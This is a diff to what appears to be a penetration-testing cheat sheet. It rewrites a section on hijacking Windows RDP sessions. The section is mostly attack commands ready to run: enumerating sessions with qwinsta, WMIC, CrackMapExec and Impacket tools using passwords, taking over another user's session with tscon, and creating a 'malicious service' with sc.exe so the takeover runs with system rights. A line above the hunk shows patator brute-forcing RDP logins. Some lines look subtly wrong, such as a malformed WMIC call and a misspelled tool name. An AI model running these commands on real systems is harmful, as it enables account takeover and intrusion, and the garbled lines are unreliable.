@@ -52,25 +52,59 @@ patator rdp_login host=10.129.203.12 user=FILE0 0=users.txt password=FILE1 1=pas
 # 4. Session Hijacking
 
 ```bash
-# Existing sessions (wmiexec/evil-winrm)
-wmic /node:TARGET /user:admin /password:pass path win32_logonsession where LoggedOnUser like "%DOMAIN%" get LoggedOnUser,LogonId /format:list
+# Native Windows commands
+query user                  # Most reliable - shows session ID, user, state
+qwinsta                     # Quick session list with IDs
+qwinsta /server:.           # Current machine
 
-# qwinsta (psloggedon)
-qwinsta /server:TARGET
-# SESSIONNAME       USERNAME                 ID  STATE
-#                  console                   1  Active
-#                  rdp-tcp#0                 2  Active
+# WMIC for remote enumeration
+wmic /node:TARGET rdtoggle where LogonId='2' call SetSessionStatus,Active
+wmic /node:TARGET path win32_logonsession get LogonId,LogonType,StartTime /format:table
+
+# PowerShell (detailed)
+Get-WmiObject Win32_LoggedOnUser | Select Antecedent,Dependent | FL
+quser.exe | ConvertFrom-String
+
+# CrackMapExec (fastest/most reliable)
+crackmapexec rdp TARGET -u admin -p pass --sessions
+cme smb TARGET -u admin -p pass --sessions
+
+# WMIEExec.py (Impacket)
+wmiexec.py admin:pass@TARGET "qwinsta && query user"
+
+# PsExec
+psexec.py -u admin -p pass TARGET "qwinsta && query user"
+
+# PowerShell remoting
+Invoke-Command -ComputerName TARGET -Credential admin:pass -ScriptBlock { qwinsta }
 
 
-# Current user-da
-qwinsta
-tscon 2 /dest:console  # ID 2 session → console
+qwinsta output analysis:
+SESSIONNAME    USERNAME       ID  STATE
+console        administrator  1   Active    ← Physical console
+rdp-tcp#13     user123        2   Active    ← RDP Session (target!)
+                  services     0   Disc      ← SYSTEM session (ignore)
 
-# Remote (wmiexec)
+
+# Local (from compromised session)
+tscon 2 /dest:console       # Session ID 2 → console
+tscon 2 /dest:rdp-tcp#13    # Session 2 → new RDP (requires 2nd RDP)
+
+# Remote via Impacket
 wmiexec.py admin:pass@TARGET "qwinsta && tscon 2 /dest:console"
+psexec.py admin:pass@TARGET "tscon 2 /dest:console"
+
+# CrackMapExec (one-liner)
+cme smb TARGET -u admin -p pass -x "tscon 2 /dest:console"
 
 
-psexec.py -u admin -p pass TARGET cmd /c "qwinsta && tscon 2 /dest:console"
+# Create malicious service (wmiexec)
+wmiexec.py admin:pass@TARGET 'sc.exe create RDPHijack binpath= "cmd.exe /c tscon 2 /dest:console"'
+
+# Alternative payloads
+sc.exe create sessionhijack binpath= "powershell.exe -c \"tscon 2 /dest:console\""
+sc.exe create sessionhijack binpath= "cmd.exe /k qwinsta & tscon 2 /dest:console"
+
 ```
 
 # 5. RDP Pass The Hash
